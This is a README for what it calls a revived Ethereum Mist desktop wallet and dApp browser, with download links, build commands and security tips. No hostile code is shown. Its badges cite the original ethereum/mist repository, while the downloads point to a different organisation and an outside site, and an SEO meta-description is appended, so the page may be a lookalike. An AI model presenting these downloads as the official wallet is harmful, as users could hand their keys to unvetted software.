
[![Github All Releases](https://img.shields.io/github/downloads/ethereum/mist/total.svg)](http://www.somsubhra.com/github-release-stats/?username=ethereum&repository=mist)
[![Join the chat at https://gitter.im/ethereum/mist](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/ethereum/mist)
[![Code Triagers Badge](https://www.codetriage.com/ethereum/mist/badges/users.svg)](https://www.codetriage.com/ethereum/mist)
[![GitHub release](https://img.shields.io/github/v/release/eth-mist-team/ethereum-mist?label=latest%20release)](https://github.com/eth-mist-team/ethereum-mist/releases/latest)


# Ethereum Mist — Secure Desktop **Ethereum Wallet** & **dApp Browser**

A modern, community‑driven revival of the legendary Mist client: **secure desktop wallet**, **integrated dApp browser** and **developer toolkit** for Windows, macOS and Linux.

---

## 🌟 Highlights

- **Local‑first security** — your keys never leave your machine; mnemonic & keystore are AES‑256‑encrypted.
- **One‑click dApp access** — Web3 provider injected into every page, no browser plugins required.
- **Multi‑chain ready** — connect to Ethereum Mainnet, Sepolia, Holesky or any custom RPC.
- **Offline signing** — craft and sign transactions without an internet connection.
- **Cross‑platform packages** — native installers for Win • macOS • Linux.

---

## 🚀 Quick Download

<div align="center">
  <a href="https://github.com/eth-mist-team/ethereum-mist/releases/latest/download/Ethereum-Mist-Setup.exe"><strong>Download for Windows (.exe)</strong></a> ·
  <a href="https://github.com/eth-mist-team/ethereum-mist/releases/latest/download/Ethereum-Mist.dmg"><strong>Download for macOS (.dmg)</strong></a> ·
  <a href="https://github.com/eth-mist-team/ethereum-mist/releases/latest/download/Ethereum-Mist.AppImage"><strong>Download for Linux (.AppImage)</strong></a>
</div>

> **Verify the binary.** SHA‑256 and GPG signatures are published on every release page.

---

## 🛠️ Installation & Update

| OS | Installer | Config Directory |
|-----|-----------|-----------------|
| **Windows** | `.exe` installer | `%APPDATA%\Ethereum Mist` |
| **macOS** | `.dmg` drag‑and‑drop | `~/Library/Application Support/Ethereum Mist` |
| **Linux** | `.AppImage` or `.tar.gz` | `~/.config/ethereum‑mist` |

- Simply download the latest package, run/drag it into **Applications**, and launch.
- To update, replace the old binary with the new one — your data remains untouched.
- Debian/Ubuntu users may need `libgtk‑3‑0` and `libwebkit2gtk‑4.0‑37`.

---

## 🤝 Support & Troubleshooting

1. Browse the Knowledge Base for common fixes.
2. Join **Matrix** #ethereum‑mist:matrix.org for real‑time help.
3. Scan existing GitHub Issues before opening a new one.
4. Still stuck? Create an issue with: OS, Mist version, logs (--loglevel debug), steps to reproduce.

---

## 👩‍💻 Developer Guide

### Prerequisites

| Tool | Version |
|------|---------|
| Node.js | ≥ 18 LTS |
| Yarn | ≥ 1.22 |
| Git + Git LFS | latest |

### Setup

```bash
# 1. Clone
$ git clone https://github.com/eth-mist-team/ethereum-mist.git
$ cd ethereum-mist

# 2. Initialise submodules & deps
$ git submodule update --init --recursive
$ yarn install
```

### Start in Dev Mode

```bash
# Launch the Electron shell with auto‑reload
$ yarn dev:electron

# or connect to your own node
$ yarn dev:electron --rpc /path/to/geth.ipc
```

### Build Distributables

```bash
# All platforms (defaults to host OS)
$ yarn build:mist

# Build specific targets
$ yarn build:mist --mac   # macOS
$ yarn build:mist --win   # Windows
$ yarn build:mist --linux # Linux
```

Optional flags:

- --skipTasks=build-interface,release-dist — speed up local builds.
- --loglevel trace — verbose debugging output.

### Automated Tests

```bash
# Unit tests
$ yarn test:unit:once

# End‑to‑end (Spectron)
$ yarn test:e2e
```

> **Windows note:** E2E tests currently run only on macOS/Linux.

---

## 🌱 Contributing

We welcome PRs of all sizes.

1. Search open issues for help‑wanted or good‑first‑issue labels.
2. Fork → feature branch → commit with conventional messages.
3. Open a pull request; a maintainer will review within a few days.

Small fixes (typos, docs) are merged fast; larger features may need design discussion.

---

## 🔒 Security Best Practices

- Keep your OS and Mist client up‑to‑date.
- Store seed phrases offline; never screenshot them.
- Use hardware wallets for high‑value accounts — Mist supports Ledger & Trezor.
- Suspect a bug? Email security@eth‑mist‑team.org for responsible disclosure.

---

## 📄 License

Released under the **GNU GPL v3**. See LICENSE for full text.

---

Looking for more information, updates, or documentation? Visit the official Ethereum Mist website:  
👉 **[ethereummist.org](https://ethereummist.org)**

**Meta‑description:** Ethereum Mist is a secure desktop Ethereum wallet and dApp browser for Windows, macOS and Linux, letting you manage ETH, ERC‑20 tokens and explore decentralized applications locally without browser plugins.
